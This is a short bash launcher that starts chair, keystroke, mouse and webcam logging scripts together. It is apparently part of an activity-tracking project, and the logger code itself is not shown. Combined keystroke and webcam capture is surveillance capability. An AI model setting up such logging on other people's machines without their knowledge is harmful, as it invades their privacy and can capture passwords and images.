#!/bin/bash
python3 chairlogger.py &
python3 keylogger.py &
python3 mouselogger.py &
bash webcamlogger.sh
